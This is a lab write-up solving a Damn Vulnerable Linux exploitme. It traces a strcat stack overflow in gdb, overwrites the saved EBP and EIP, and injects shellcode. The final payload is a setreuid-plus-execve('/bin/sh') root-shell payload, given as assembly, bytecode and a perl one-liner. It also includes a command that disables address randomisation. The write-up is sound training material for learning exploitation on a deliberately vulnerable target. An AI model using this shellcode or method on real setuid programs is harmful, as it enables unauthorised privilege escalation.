Target: CESD DVL Assessment #2	|
Author: digitalbyte	 	|
________________________________|

Tools used:
- gdb (incl mammon gdbinit, get it from here for example: http://www.eccentrix.com/members/mammon/gdb_init.txt)
- objdump
- texteditor of your choise
- nasm (for compiling.. every other assembley compiler will also work fine)

Things needed:
- understanding of linux assembly
- the internet searchengine of your choice (to collect knowledge)

Links you should take care:
- alwayse usefull: http://developer.intel.com/design/pentium/manuals/243191.htm the Intel Instruction Reference
- www.asciitable.com for quickchecking things...
- http://en.wikipedia.org/wiki/Endianess
- http://www.acm.uiuc.edu/sigmil/talks/shellcode/shellcode.html

###################################################notice############################################################
#            !!!You don't have to care about this notice if your working with DVL!!!                                #
#to exploit this exploitme for us the beginners it's neccessary to switch off things like Virtual Adress Space      #
#Randomisation (this you can do with:  "echo 0 > /proc/sys/kernel/randomize_va_space" as root) or Pax on our linux- #
#machines. 													    #
#####################################################################################################################

Content:
(01) analyzing
(02) debugging
(03) shellcoding
(04) outro






::::::::::::::::::::::::::::::::::::::::::::::::::(01)analyzing:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::









So let's start. Just unpack the zip to get our toy: 01_exploitme02. Now let's check what it is, simply by typing file 01_exploitme02 and we get:

01_exploitme02: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.2.0, dynamically linked (uses shared libs), for GNU/Linux 2.2.0, not stripped

So, we know it's an elf-file which is dynamically linked and not stripped. That's not stripped makes the work for us way easier because we can better handle it with our tools. Now let's simply start it. We will get the warning: 

Please enter a positive adjective! 

but the program exits before we can do any input. So what does this exploitme expect? A cmdl paramter or a keyfile or ...? Let's try it :) You will fast see that the first one is the rigth solution: a parameter. So we start it now with ./01_exploitme02 easy and we get:
 echo 0 > /proc/sys/kernel/randomize_va_space
Exploiting applications is easy

We know that somewhere in this 01_exploitme02 is an exploitable buffer and this program is really short and does nothing but printing: "Exploiting applications is" + Parameter and "Please enter a posi..." with no input. Because the parameter is our only input, this is the only obvious target we have. So just let us smash this input. 
For that use I will take perl. I'm sure you can write a lots of tools in a lots of languages to do this task but perl seems quite good for this job. A simple perl syntax for a oneline is: perl -e 'print "A"'. Which will of course print A to your screen. But a good thing is you can also use direct hexinput: perl -e 'print chr(0x41)' prints also A on your screen and 41 is the hexcode of A. If you want to write more A's you simply put the multiplier x behind it: perl -e 'print chr(0x41)x64' writes 64 times A on your screen.
Now let's try this on our aim. Do ./01_exploitme02 `perl -e print' chr(0x41)x100'` and you get Exploiting Applications + 100 A's as excepted. hmmm how many A's will fit into the places they go after we typed them in? Let's get behind this with 200 A's and we see: Segmentation fault (core dumped). Yeahh that's what we have been looking for a segfault! Something runs now wrong in the exploitme just because we typed too much in. If we try it further we will get behind that the segfault happens exact after 112 asciichars as input.

So now before we first open up the exploitme with a debugger or disassembler we have some good infos:
- we can put in 112 asciis without error
- the segfault is after the code which writes the string, because our input is still written







::::::::::::::::::::::::::::::::::::::::::::::::::::(02)debugging:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::










Now let's use gdb (and I really just can tell you to use mammons gdbinit script (google it!!!) it's great). We open it with gdb 01_exploitme02. Then I do: "set disassembly-flavor intel" because I like it. If you don't do nothing and you have AT&T one.. now let's set a breakpoit on "main" with b main and run it with 113 A's with r `perl -e print' chr(0x41)x113'` and it should break at <main+4>:     sub    esp,0xa4, nothing special here so let's step over with "n" until something interesting happens... we find this loop which has nothing for us: <main+103>:   rep stos DWORD PTR es:[edi],eax... so we trace over it and never look back ;)..... then suddenly that appears in front of our eyes:

     eax:BFFFF6D0 ebx:4DE1DFF4  ecx:00000000  edx:00000000     eflags:00000286
     esi:4DCEACE0 edi:BFFFF750  esp:BFFFF6B0  ebp:BFFFF758     eip:08048460
     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
[007B:BFFFF6B0]---------------------------------------------------------[stack]
BFFFF6E0 : 63 61 74 69  6F 6E 73 20 - 69 73 20 00  00 00 00 00 cations is .....
BFFFF6D0 : 45 78 70 6C  6F 69 74 69 - 6E 67 20 61  70 70 6C 69 Exploiting appli
BFFFF6C0 : 00 00 00 00  01 00 00 00 - 00 00 00 00  00 00 00 00 ................
BFFFF6B0 : D0 F6 FF BF  46 F9 FF BF - 28 FB FF B7  01 00 00 00 ....F...(.......
[007B:4DCEACE0]---------------------------------------------------------[ data]
4DCEACE0 : 00 00 00 00  00 10 00 00 - 11 06 02 00  0B F9 FF BF ................
4DCEACF0 : 04 00 00 00  F8 FA FF B7 - 03 00 00 00  64 00 00 00 ............d...
[0073:08048460]---------------------------------------------------------[ code]
0x8048460 <main+156>:   call   0x80482d8 <strcat@plt>
0x8048465 <main+161>:   lea    eax,[ebp-0x88]
0x804846b <main+167>:   mov    DWORD PTR [esp+4],eax
0x804846f <main+171>:   mov    DWORD PTR [esp],0x8048664
0x8048476 <main+178>:   call   0x80482e8 <printf@plt>
0x804847b <main+183>:   mov    DWORD PTR [ebp-0x8c],0x0
------------------------------------------------------------------------------
0x08048460 in main ()

We see in the stack: "Exploiting application is" but nothing from our A's. Also if we took a brighter look with x/50w bffff6e0 nothing from our code in the stack. Then we see that the functions strcat and printf are called. printf does what we think it does: it writes a string to the screen. But what does strcat? Of course google gives us an answer:

Appends a copy of the source string to the destination string. The terminating null character in destination is overwritten by the first character of source, but a new null-character is appended at the end of the new string formed by the concatenation of both in destination.

Parameters

destination
    Pointer to the destination array, which should contain a string and should be large enough to contain the concatenated resulting string.

source
     string to be appended. 

If you had take a look two lines above the strcat call you had seen that eax will be passed a pointer to the "Exploiting applications is" string in the stack. So what will happen is that strcat copies our input at the end of the "Exploiting..." string and then writes this new string with printf.

Interesting is the destination part: a pointer to the dest array which "should" be large enough.... Should? Means that? Yes it does :D Strcat doesn't check if the destination is even large enough for the new string. But if strcat doesn't and the author doesn't ? Who checks it ? :) Right you are, noone. So if we step over this line with n we see now that our A's are in the stack and we trace it to the end until the leave instruction. There we suddenly get:
Cannot access memory at address 0x41414145

huhhh ? Isn't that suspicious? 414141... 41 = hexcode of A, so there is an error because the program tries to access memory at an adredd which consists of our injected code. So what does leave actually do? The intel doc tells us:
LEAVE Set ESP to EBP, then pop EBP. So it copies the adress in ebp to esp. There can't be an error while copying adresses... pop ebp: takes the last 32bit from the stack and puts it in the adress of ebp. If we look at ebp we see:
gdb > x/w bffff758
0xbffff758:     0x41414141
so the adress in ebp points to 0x41414141 which are our A's and which is of course no place where bytes can be written to.

And that's why the error occurs. The program tries while the leave instruction to write to 0x41414141 which doesn't work.

So at this place we know that we can take influence to ebp and esp. But also eip? How to check this? Simply by fixing the ebp and take a further look for what happens. How to fix that? Well we just have to give him an adress where he can write to. Finding such an adress you can for example by debugging the exploitme with a smaller input which makes no error. And simply checking ebp at the same time we did above. So I get: bffff828 ; let's now append this to our input and think at the same time about the little endianess. So our adress must be given backwards. Also think about minoring the count of A's for the count you put in.
`perl -e print' chr(0x41)x109 .chr(0x28) .chr(0xf8) .chr(0xff) .chr(0xbf)'`

now leave is passed without any problems but we will get a segfault after ret. If we take a look to eip we can imagine why. There we have 4DD03800 which is acutally no offset to exploitme can continue to run. If we do this trick again but wait at the leave instruction and take a closer look at the stack we can see this here:

gdb> 
_______________________________________________________________________________
     eax:00000000 ebx:4DE1DFF4  ecx:00000000  edx:4DE1F0B0     eflags:00000282
     esi:4DCEACE0 edi:41414141  esp:BFFFF6B0  ebp:BFFFF758     eip:0804848E
     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a p c 
[007B:BFFFF6B0]---------------------------------------------------------[stack]
BFFFF6E0 : 63 61 74 69  6F 6E 73 20 - 69 73 20 41  41 41 41 41 cations is AAAAA
BFFFF6D0 : 45 78 70 6C  6F 69 74 69 - 6E 67 20 61  70 70 6C 69 Exploiting appli
BFFFF6C0 : 00 00 00 00  01 00 00 00 - 00 00 00 00  00 00 00 00 ................
BFFFF6B0 : 64 86 04 08  D0 F6 FF BF - 28 FB FF B7  01 00 00 00 d.......(.......
[007B:4DCEACE0]---------------------------------------------------------[ data]
4DCEACE0 : 00 00 00 00  00 10 00 00 - 11 06 02 00  0B F9 FF BF ................
4DCEACF0 : 04 00 00 00  F8 FA FF B7 - 03 00 00 00  64 00 00 00 ............d...
[0073:0804848E]---------------------------------------------------------[ code]
0x804848e <main+202>:   leave  
0x804848f <main+203>:   ret    
0x8048490 <__libc_csu_init>:    push   %ebp
0x8048491 <__libc_csu_init+1>:  mov    %esp,%ebp
0x8048493 <__libc_csu_init+3>:  push   %edi
0x8048494 <__libc_csu_init+4>:  push   %esi
------------------------------------------------------------------------------
0x0804848e in main ()
gdb> x/50w bffff6e0
0xbffff6e0:     0x69746163      0x20736e6f      0x41207369      0x41414141
0xbffff6f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff700:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff750:     0x41414141      0x41414141      0xbffff828      0x4dd03800
0xbffff760:     0x00000002      0xbffff7e4      0xbffff7f0      0x4dceb878
0xbffff770:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff780:     0x4de1dff4      0x4dceace0      0x00000000      0xbffff7b8
0xbffff790:     0x40f5f760      0xb2da3891      0x00000000      0x00000000
0xbffff7a0:     0x00000000      0x4dce2d40

So you can see what comes right next to our injected ebp(bffff828)? Right you are that's eip :)
So simply let's try again to modify our input to proove if we can also overwrite this:
`perl -e print' chr(0x41)x109 .chr(0x28) .chr(0xf8) .chr(0xff) .chr(0xbf) .chr(0x42)x4'`

If we are right our program should stop and tell us that he can't write to 0x42424242 and that's exaclty what happens:

gdb> 
_______________________________________________________________________________
     eax:00000000 ebx:4DE1DFF4  ecx:00000000  edx:4DE1F0B0     eflags:00000282
     esi:4DCEACE0 edi:41414141  esp:BFFFF760  ebp:BFFFF828     eip:42424242
     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a p c 
[007B:BFFFF760]---------------------------------------------------------[stack]
BFFFF790 : 60 F7 F5 40  91 38 DA B2 - 00 00 00 00  00 00 00 00 `..@.8..........
BFFFF780 : F4 DF E1 4D  E0 AC CE 4D - 00 00 00 00  B8 F7 FF BF ...M...M........
BFFFF770 : 00 00 00 00  01 00 00 00 - 01 00 00 00  00 00 00 00 ................
BFFFF760 : 00 00 00 00  E4 F7 FF BF - F0 F7 FF BF  78 B8 CE 4D ............x..M
[007B:4DCEACE0]---------------------------------------------------------[ data]
4DCEACE0 : 00 00 00 00  00 10 00 00 - 11 06 02 00  0B F9 FF BF ................
4DCEACF0 : 04 00 00 00  F8 FA FF B7 - 03 00 00 00  64 00 00 00 ............d...
[0073:42424242]---------------------------------------------------------[ code]
0x42424242:     Error while running hook_stop:
Cannot access memory at address 0x42424242
0x42424242 in ?? ()
gdb> 

You see eip is ours now :) What you should also notice here is that we changed eax and edi (which is obvious here) indirectly by changing ebp:
<main+193>:   mov    eax,DWORD PTR [ebp-0x8c]
<main+199>:   mov    edi,DWORD PTR [ebp-4]

I really can't remember and reproduce it but in one scenario this made some trouble in the way that also edi had to be changed to a writeable adress... as long as there's no trouble don't think about it :) 









::::::::::::::::::::::::::::::::::::::::::::::::::::(03)shellcoding:::::::::::::::::::::::::::::::::::::::::::::::::::::::::








So far we are. Now we know how to inject our code and how to change eip. No let's put this together and let's change eip to an adress of our own injected code.

For the beginning an exit code. Simply write it in assembler and compile it:

section .text
	global _start

_start:
	xor eax,eax
	inc eax        
	xor ebx,ebx  
	int 80h			

why? xor eax,eax; inc eax and not mov eax,1? That you get out after diassembling your program with objdump and forewards adding mov eax,1 in front of the xor eax,eax:

$ objdump -d -M intel exit
exit:     Dateiformat elf32-i386

Disassemblierung der Sektion .text:

08048080 <_start>:
 8048080:       b8 01 00 00 00          mov    eax,0x1
 8048085:       31 c0                   xor    eax,eax
 8048087:       40                      inc    eax
 8048088:       31 db                   xor    ebx,ebx
 804808a:       cd 80                   int    0x80


No you see that move eax,0x1 has 5 bytes where the other method just has 3 and more important the other options has no 00 in is bytecode. That's quite important because most shellcode is injected through strings like ours and 00 is a string delimiter, so would we pass this the program would think after 00 the string inputed would end. That's of course not what we want so we trash this line again and get:

 8048085:       31 c0                   xor    eax,eax
 8048087:       40                      inc    eax
 8048088:       31 db                   xor    ebx,ebx
 804808a:       cd 80                   int    0x80


So the bytecode of our exit is: 31 c0 40 31 db cd 80.

Now let's try to pass this to our program and let eip point to it:


`perl -e print' chr(0x41)x102 .chr(0x31). chr(0xc0). chr(0x40). chr(0x31).chr(0xdb). chr(0xcd). chr(0x80) .chr(0x28) .chr(0xf8) .chr(0xff) .chr(0xbf) .chr(0x42)x4'`

Of course we just have to find out the "right" eip so take the above as input and break somewhere after the strcat and check the stack there:
gdb> 
_______________________________________________________________________________
     eax:BFFFF6D0 ebx:4DE1DFF4  ecx:BFFFF9B4  edx:FFFFFDA9     eflags:00000206
     esi:4DCEACE0 edi:BFFFF750  esp:BFFFF6B0  ebp:BFFFF758     eip:08048465
     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s z a P c 
[007B:BFFFF6B0]---------------------------------------------------------[stack]
BFFFF6E0 : 63 61 74 69  6F 6E 73 20 - 69 73 20 41  41 41 41 41 cations is AAAAA
BFFFF6D0 : 45 78 70 6C  6F 69 74 69 - 6E 67 20 61  70 70 6C 69 Exploiting appli
BFFFF6C0 : 00 00 00 00  01 00 00 00 - 00 00 00 00  00 00 00 00 ................
BFFFF6B0 : D0 F6 FF BF  42 F9 FF BF - 28 FB FF B7  01 00 00 00 ....B...(.......
[007B:4DCEACE0]---------------------------------------------------------[ data]
4DCEACE0 : 00 00 00 00  00 10 00 00 - 11 06 02 00  0B F9 FF BF ................
4DCEACF0 : 04 00 00 00  F8 FA FF B7 - 03 00 00 00  64 00 00 00 ............d...
[0073:08048465]---------------------------------------------------------[ code]
0x8048465 <main+161>:   lea    0xffffff78(%ebp),%eax
0x804846b <main+167>:   mov    %eax,0x4(%esp)
0x804846f <main+171>:   movl   $0x8048664,(%esp)
0x8048476 <main+178>:   call   0x80482e8 <printf@plt>
0x804847b <main+183>:   movl   $0x0,0xffffff74(%ebp)
0x8048485 <main+193>:   mov    0xffffff74(%ebp),%eax
------------------------------------------------------------------------------
0x08048465 in main ()
gdb> x/50w bffff6e0
0xbffff6e0:     0x69746163      0x20736e6f      0x41207369      0x41414141
0xbffff6f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff700:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff750:     0x40c03141      0x80cddb31      0xbffff828      0x42424242
0xbffff760:     0x00000000      0xbffff7e4      0xbffff7f0      0x4dceb878
0xbffff770:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff780:     0x4de1dff4      0x4dceace0      0x00000000      0xbffff7b8
0xbffff790:     0x40f5f760      0xb2da3891      0x00000000      0x00000000
0xbffff7a0:     0x00000000      0x4dce2d40
gdb> x/w bffff751
0xbffff751:     0x3140c031

You see that on bffff751 is your injected code (of course backwards, think about the little endianess again) so let's change eip from 42424242  to bffff751:

`perl -e print' chr(0x41)x102 .chr(0x31). chr(0xc0). chr(0x40). chr(0x31).chr(0xdb). chr(0xcd). chr(0x80) .chr(0x28) .chr(0xf8) .chr(0xff) .chr(0xbf) .chr(0x51) .chr(0xf7) .chr(0xff) .chr(0xbf)'`

and tadaaaaaaaaaaaa: you see in gdb that your code is executed correctly and the program exits :D You can also check this in the console:

$ ./01_exploitme02 `perl -e print' chr(0x41)x102 .chr(0x31). chr(0xc0). chr(0x40). chr(0x31).chr(0xdb). chr(0xcd). chr(0x80) .chr(0x28) .chr(0xf8) .chr(0xff) .chr(0xbf) .chr(0x51) .chr(0xf7) .chr(0xff) .chr(0xbf)'`
Exploiting applications is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1�@1�̀(���Q
$ 

you see our shellcode exitst the program without any error, exactly as it should.

We finally made it and injected and executed our own code in a hostile app.

But you will say exiting an app is a little bit lame, so now we wanna try to inject a little "helloworld"-code. What we have to know here is that we can't simply call the helloworld string as in a compiled one because we won't know it's adress.
To bypass this there's a nice trick you will see (I commented code for understanding):

section .text
	global _start

_start:
	jmp short stuff      ; jumps direct down just to call code
code:
	pop esi             ; esi contains now a pointer to the string hello after the "call code"

	xor eax,eax         ; eax gets the right kernel code, why we don't use mov you should know already from above
	inc eax
	inc eax
	inc eax
	inc eax         
	xor ebx,ebx         ; ebx gets 1 for standard output
	inc ebx       
	mov ecx,esi       ; ecx gets the pointer to the string from esi
	xor edx,edx
	inc edx          ; all folowing lines inc edx to pass the stringlength
	inc edx
	inc edx
	inc edx   
	inc edx 
	int 80h         ; calls kernel to write the string       
	


	xor eax,eax    ; exits the program
	inc eax        
	xor ebx,ebx  
	int 80h			

stuff:
	call code
	db 'Hello'

Compile it, disassemble it again with objdump and writedown the bytecode (or use my scipt(dumper.pl) attached to this solution to extract bytecode from objdump) and add it to your perl input (of course you have to minor the A's count again and of course eip to the new beginning of your code:

`perl -e print' chr(0x41)x69 .chr(0xeb).chr(0x1c).chr(0x5e).chr(0x31).chr(0xc0).chr(0x40).chr(0x40).chr(0x40).chr(0x40).chr(0x31).chr(0xdb).chr(0x43).chr(0x89).chr(0xf1).chr(0x31).chr(0xd2).chr(0x42).chr(0x42).chr(0x42).chr(0x42).chr(0x42).chr(0xcd).chr(0x80).chr(0x31).chr(0xc0).chr(0x40).chr(0x31).chr(0xdb).chr(0xcd).chr(0x80).chr(0xe8).chr(0xdf).chr(0xff).chr(0xff).chr(0xff).chr(0x48).chr(0x65).chr(0x6c).chr(0x6c).chr(0x6f) .chr(0x28) .chr(0xf8) .chr(0xff) .chr(0xbf) .chr(0x2e) .chr(0xf7) .chr(0xff) .chr(0xbf)'`

And you see in debugger as in the console:
$ ./01_exploitme02 `perl -e print' chr(0x41)x69 .chr(0xeb).chr(0x1c).chr(0x5e).chr(0x31).chr(0xc0).chr(0x40).chr(0x40).chr(0x40).chr(0x40).chr(0x31).chr(0xdb).chr(0x43).chr(0x89).chr(0xf1).chr(0x31).chr(0xd2).chr(0x42).chr(0x42).chr(0x42).chr(0x42).chr(0x42).chr(0xcd).chr(0x80).chr(0x31).chr(0xc0).chr(0x40).chr(0x31).chr(0xdb).chr(0xcd).chr(0x80).chr(0xe8).chr(0xdf).chr(0xff).chr(0xff).chr(0xff).chr(0x48).chr(0x65).chr(0x6c).chr(0x6c).chr(0x6f) .chr(0x28) .chr(0xf8) .chr(0xff) .chr(0xbf) .chr(0x2e) .chr(0xf7) .chr(0xff) .chr(0xbf)'`
Exploiting applications is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�^1�@@@@1�C��1�BBBBB̀1�@1�̀�����Hello(���.
Hello$

The exploitme is executed without any errors and writes Hello on the screen which will appear directly left from your prompt, because you gave Hello no newlinefeed with and will then exit.


So thats a little bit more, but we can do better ;) Let's now face with the last enemy: the shellcode! 

Yes,yes what do expect from our shellcode? It should open a shell with su-right and exit. Again we have to take care, that we can't get the direct adress of our string /bin/sh and have again to use the above workaround. Again the assemblercode I commented:

section .text
	global _start

_start:

        xor eax, eax
        mov al, 70              
        xor ebx, ebx
        xor ecx, ecx
        int 0x80                ; calls kernel for setruid to get su rights

        jmp short stuff		; jumps down to stuff


code:

        pop ebx                 ; get's the adress of our string again
        xor eax, eax		; makes eax to 00000000

        mov [ebx+7] , al	; replaces the N in the string with the stringlimiter 00 (without using 00 in bytecode,good trick!!)
        
        mov [ebx+8 ], ebx       ;put the address of the string to where the AAAA is
        mov [ebx+12], eax       ;put 4 null bytes into where the BBBB is
        mov al, 11              ;execve is syscall 11
        lea ecx, [ebx+8]        ;load the address of where the AAAA was
        lea edx, [ebx+12]       ;load the address of the NULLS
        int 0x80                ;call the kernel to execute the shell /bin/sh

stuff:
        call code
        db '/bin/shNAAAABBBB' 

::notice:: if you compile this and wanna run it in the console to check if it works you have to link with -N param (ld -N -o test test.o) to enable writepermission in the text.segment, otherwise you will get a segfault here: mov [ebx+7] , al, because it tries to write 00 over the N in the text.segment. If you don't execute this code as it is but inject it in our exploitme you don't have to struggle with this...

And again you have to compile it, disassemble it and get out the bytecode of it, minoring the A's, changing eip... :

`perl -e print' chr(0x41)x54 .chr(0x31).chr(0xc0).chr(0xb0).chr(0x46).chr(0x31).chr(0xdb).chr(0x31).chr(0xc9).chr(0xcd).chr(0x80).chr(0xeb).chr(0x16).chr(0x5b).chr(0x31).chr(0xc0).chr(0x88).chr(0x43).chr(0x07).chr(0x89).chr(0x5b).chr(0x08).chr(0x89).chr(0x43).chr(0x0c).chr(0xb0).chr(0x0b).chr(0x8d).chr(0x4b).chr(0x08).chr(0x8d).chr(0x53).chr(0x0c).chr(0xcd).chr(0x80).chr(0xe8).chr(0xe5).chr(0xff).chr(0xff).chr(0xff).chr(0x2f).chr(0x62).chr(0x69).chr(0x6e).chr(0x2f).chr(0x73).chr(0x68).chr(0x4e).chr(0x41).chr(0x41).chr(0x41).chr(0x41).chr(0x42).chr(0x42).chr(0x42).chr(0x42).chr(0x28) .chr(0xf8) .chr(0xff) .chr(0xbf) .chr(0x21) .chr(0xf7) .chr(0xff) .chr(0xbf)'`

double check your code in the console and debugger if executed correctly and we finally got it :) a working shell



::::::::::::::::::::::::::::::::::::::::::::::::::::(04)outro:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
thanks stingduk for his help ;)  This was my first exploitme and I hope you understood my solution :)
 

greets

digitalbyte




